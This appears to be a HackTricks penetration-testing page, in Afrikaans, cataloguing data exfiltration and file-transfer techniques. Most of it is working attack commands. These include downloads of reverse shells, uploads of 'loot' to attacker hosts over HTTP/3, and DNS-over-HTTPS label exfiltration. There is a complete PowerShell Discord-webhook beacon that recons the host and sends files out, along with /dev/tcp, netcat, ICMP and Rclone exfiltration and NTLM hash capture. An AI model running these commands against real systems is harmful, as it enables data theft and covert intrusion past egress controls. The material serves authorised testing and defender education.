# Exfiltration

{{#include ../banners/hacktricks-training.md}}

> [!TIP]
> Vir 'n end-tot-end-voorbeeld van die staging van loot in `C:\Users\Public` en die exfiltration daarvan met Rclone om wettige backups na te boots, hersien die workflow hieronder.

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## Algemeen gewhiteliste domeine om inligting te exfiltreer

Gaan na [https://lots-project.com/](https://lots-project.com/) om algemeen gewhiteliste domeine te vind wat misbruik kan word

## Copy\&Paste Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Laai lêers op

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Python-module [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPS-bediener**
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
### HTTP/3 / QUIC

As die egress-kontroles ingestel is vir inspeksie van klassieke **TCP/443**, maar toegeeflik is met **UDP/443**, kan die afdwinging van **HTTP/3** die oordrag na **QUIC** verskuif in plaas van TLS-oor-TCP. Die aanvaller se eindpunt benodig inheemse HTTP/3-ondersteuning (byvoorbeeld ’n reverse proxy of upload endpoint wat reeds `Alt-Svc: h3` adverteer).
```bash
# Strict: fail if QUIC/H3 is not available
curl --http3-only -T loot.7z https://attacker-h3.example/upload

# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
curl --http3 -T loot.7z https://attacker-h3.example/upload

# Learn the server's Alt-Svc advertisement and reuse it
curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
```
'n Navorsingsartikel van 2025 (QUIC-Exfil) het getoon dat QUIC-funksies soos geënkripteerde kopstukke en verbindingmigrasie opsporing van exfiltration op firewall-vlak moeiliker kan maak as klassieke TLS- of DNS-gebaseerde kanale. Verwag dus dat hierdie gebied meer relevant sal word namate HTTP/3-ondersteuning uitbrei.<sup>[[9]](#references)</sup>

### Vooraf-ondertekende / gedelegeerde object-storage-oplaaie

Wanneer jy 'n kortstondige **ondertekende URL** kan skep of verkry, benodig die slagoffer slegs 'n normale HTTPS-kliënt. Dit vermy die installering van cloud SDKs of langdurige credentials op die gasheer en meng in by algemene object-storage-verkeer.

**Linux / macOS (AWS S3 pre-signed `PUT`)**
```bash
curl -X PUT -T loot.7z \
-H 'Content-Type: application/octet-stream' \
'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
```
**Windows PowerShell (AWS S3 pre-signed `PUT`)**
```powershell
Invoke-WebRequest -Method Put -InFile .\loot.7z `
-ContentType 'application/octet-stream' `
-Uri $presignedUrl
```
**Azure Blob SAS URL**
```bash
curl -X PUT --data-binary @loot.7z \
-H 'x-ms-blob-type: BlockBlob' \
-H 'Content-Type: application/octet-stream' \
'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```
Aantekeninge:
- Pre-signed URLs / SAS tokens beperk gewoonlik die **path**, **HTTP method** en **expiration**.
- Vir Azure Blob `Put Blob` is `x-ms-blob-type: BlockBlob` verpligtend.
- Hierdie patroon werk goed met `curl`, `Invoke-WebRequest`, of enige custom implant wat ’n rou HTTPS `PUT` kan uitvoer.<sup>[[8]](#references)</sup>

### goshs

[goshs](https://github.com/patrickhener/goshs) is ’n enkel-binary plaasvervanger vir `python3 -m http.server`<sup>[[4]](#references)</sup>
met upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links,
en OOB-samewerkingskenmerke (DNS, SMTP, NTLM hash capture).<sup>[[4]](#references)</sup>
```bash
# Serve current directory on port 8000
goshs

# Serve with HTTPS (self-signed)
goshs -s -ss

# Serve with basic auth
goshs -b user:password

# Upload-only mode
goshs -uo

# Read-only mode
goshs -ro

# Capture SMB NTLM hashes
goshs -smb -smb-domain CORP

# DNS callback server
goshs -dns -dns-ip 10.10.10.10

# SMTP callback server
goshs -smtp -smtp-domain [REDACTED]

# Tunnel via localhost.run (no port forwarding needed)
goshs -tunnel
```
## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration

Webhooks is slegs-skryf HTTPS-eindpunte wat JSON en opsionele lêerdele aanvaar. Hulle word algemeen aan trusted SaaS-domeine toegelaat en vereis geen OAuth/API keys nie, wat hulle nuttig maak vir beaconing en exfiltration met min wrywing.<sup>[[5]](#references)[[6]](#references)</sup>

Sleutelidees:
- Eindpunt: Discord gebruik https://discord.com/api/webhooks/<id>/<token>
- POST multipart/form-data met ’n deel genaamd payload_json wat {"content":"..."} bevat, en opsionele lêerdele genaamd file.
- Operator-luspatroon: periodieke beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK bevestig aflewering.

PowerShell PoC (Discord):
```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
param([string]$Text)
$payload = @{ content = $Text } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$resp = $client.PostAsync($webhook, $mp).Result
Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
param([string]$Path, [string]$Name)
if (-not (Test-Path $Path)) { return }
$bytes = [System.IO.File]::ReadAllBytes($Path)
$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$mp.Add($fileContent, "file", $Name)
$resp = $client.PostAsync($webhook, $mp).Result
Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
$ctr++
# Beacon
$beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
Send-DiscordText -Text $beacon

# Every 2nd: quick folder listing
if ($ctr % 2 -eq 0) {
$dirs = @("Documents","Desktop","Downloads","Pictures")
$acc = foreach ($d in $dirs) {
$p = Join-Path $env:USERPROFILE $d
$items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
}
Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
}

# Every 3rd: targeted exfil
if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

# Every 4th: basic recon
if ($ctr % 4 -eq 0) {
$who = whoami
$ip  = ipconfig | Out-String
$tmp = Join-Path $env:TEMP "recon.txt"
"whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
Send-DiscordFile -Path $tmp -Name "recon.txt"
}

Start-Sleep -Seconds 20
}
```
Notas:
- Soortgelyke patrone is van toepassing op ander collaboration platforms (Slack/Teams) wat hul incoming webhooks gebruik; pas die URL en JSON schema dienooreenkomstig aan.
- Vir DFIR van Discord Desktop-cache-artefakte en webhook/API recovery, sien:<sup>[[7]](#references)</sup>

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## Rclone (cloud/object-storage exfiltration)

Moderne operateurs stage dikwels loot plaaslik en gebruik dan [Rclone](https://rclone.org/) om die oordrag soos ’n normale backup- of sync-job te laat lyk. ’n Praktiese patroon is:

1. ’n Normale remote (`s3`, `webdav`, `drive`, `mega`, ...)
2. ’n `crypt`-wrapper sodat **inhoud en lêername client-side encrypted** word
3. ’n Opsionele `chunker`-wrapper indien die provider object-size-limits afdwing of jy kleiner upload-units wil hê
```bash
# 1) Create the storage backend remote (interactive)
rclone config              # ex: remote

# 2) Wrap it with client-side encryption
rclone config              # ex: secret -> remote:path

# 3) Optional: create a chunker overlay for large objects
rclone config              # ex: overlay -> secret:

# 4) Upload staged data
rclone copy /loot secret:$(hostname)-$(date +%F) \
--transfers 2 --checkers 2 --bwlimit 4M
# If you created the chunker wrapper, upload to overlay:... instead
```
Notas:
- `crypt` kan beide lêerinhoud en name enkripteer.<sup>[[3]](#references)</sup>
- `chunker` verdeel groot lêers deursigtig en stel hulle weer saam wanneer dit afgelaai word.
- `rclone.conf` stoor `crypt`-geheime in ’n **verdoeselde** vorm, nie as sterk beskerming van data-in-rus nie. Vir kortstondige operasies, verkies ’n toegewyde tydelike konfigurasie en verwyder dit daarna. Indien jy dit langer moet behou, verkies geënkripteerde konfigurasiehantering (`RCLONE_CONFIG_PASS` / `--password-command`) bo om ’n onverwerkte `rclone.conf` op skyf te laat.
- Indien die teiken reeds **OneDrive**, **Google Drive** of **Dropbox** sinkroniseer, kan die kopiëring van loot na die gesinkroniseerde gids op ’n reeds goedgekeurde kliënt ry, in plaas daarvan om ’n nuwe oordrag-binary te laat val.

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
{{#endref}}

## FTP

### FTP server (python)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP-bediener (NodeJS)
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP-bediener (pure-ftp)
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows**-kliënt
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
## SMB

Kali as bediener
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Of skep ’n smb share **using samba**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
Windows
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
### goshs
[goshs](https://github.com/patrickhener/goshs) is 'n alternatief wat uit 'n enkele binary bestaan<sup>[[4]](#references)</sup>
wat lêers oor SMB bedien en NetNTLMv2-hashes van verbindende kliënte vaslê:
```bash
# Start SMB server with NTLM hash capture
goshs -smb -smb-domain CORP

# Also works for plain HTTP file serving
goshs
```
## SCP

Die aanvaller moet SSHd aan die gang hê.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

As die slagoffer SSH het, kan die aanvaller ’n gids vanaf die slagoffer op die aanvaller mount.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
## /dev/tcp

### Laai lêer van slagoffer af
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Laai lêer op na slagoffer
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
danksy **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## DNS over HTTPS (DoH)

As klassieke UDP/53 DNS raserig of geblokkeer is, maar uitgaande HTTPS algemeen toegelaat word, kan die gewone DNS-label-exfiltration-patroon in **DoH**-versoeke na ’n publieke resolver verpak word. Hou elke label ver onder die DNS-limiet van 63 grepe en gebruik ’n DNS-veilige alfabet soos Base32.
```bash
# Encode -> split into DNS-safe labels -> send via DoH
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
nl -nrz -w4 -s. | while read chunk; do
curl --http2 -s \
-H 'accept: application/dns-json' \
"https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
>/dev/null
done
```
Op die gesaghebbende DNS-bediener vir `exf.attacker.tld`, sorteer die navrae volgens die numeriese voorvoegsel en herskep die Base32-stroom. Dit hou die transport binne HTTPS na die resolver, eerder as klassieke UDP/53 DNS.<sup>[[2]](#references)</sup>

Vir volledige bidirectional DNS tunnel tooling (`iodine`, `dnscat2`, ens.), raadpleeg [die tunneling-bladsy](tunneling-and-port-forwarding.md).

## **SMTP**

As jy data na ’n SMTP-bediener kan stuur, kan jy met python ’n SMTP skep om die data te ontvang:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
### goshs

[goshs](https://github.com/patrickhener/goshs) kan 'n vinnige SMTP-bediener opstel<sup>[[4]](#references)</sup>
om e-pos-callbacks tydens OOB exfiltration-scenario's op te vang:
```bash
# Start SMTP callback server
goshs -smtp -smtp-domain [REDACTED]
```
Ontvange e-posse en callbacks word direk in die terminal-uitvoer vertoon.  
Kan met die DNS callback server gekombineer word vir volledige OOB-dekking:
```bash
# DNS + SMTP combined
goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
```
## TFTP

By verstek in XP en 2003 (in ander weergawes moet dit uitdruklik tydens installasie bygevoeg word)

In Kali, **begin TFTP-bediener**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**TFTP-bediener in Python:**
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
Op **victim**, koppel aan die Kali-bediener:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Laai 'n lêer af met 'n PHP oneliner:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Slagoffer**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

Die `debug.exe`-program laat nie net inspeksie van binêre lêers toe nie, maar het ook die **vermoë om hulle vanaf hex te herbou**. Dit beteken dat `debug.exe` die binêre lêer kan genereer deur die hex van ’n binêre lêer te verskaf. Dit is egter belangrik om daarop te let dat debug.exe ’n **beperking het om lêers tot 64 kb groot saam te stel**.<sup>[[1]](#references)</sup>
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
Dan kopieer-en-plak die teks in die windows-shell, en ’n lêer genaamd nc.exe sal geskep word.

## Verwysings

- [1] [Lêers na Windows oordra](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
- [2] [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
- [3] [Rclone `crypt` backend](https://rclone.org/crypt/)
- [4] [goshs](https://github.com/patrickhener/goshs)
- [5] [Discord as ’n C2 en die gekaste bewyse wat agtergelaat word](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [6] [Discord Webhooks – Voer Webhook uit](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [7] [Discord Forensic Suite (kasontleder)](https://github.com/jwdfir/discord_cache_parser)
- [8] [Laai objekte op met voorafondertekende URL’s - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
- [9] [QUIC-Exfil: Exploiting QUIC's Server Preferred Address Feature to Perform Data Exfiltration Attacks](https://arxiv.org/abs/2505.05292)

{{#include ../banners/hacktricks-training.md}}
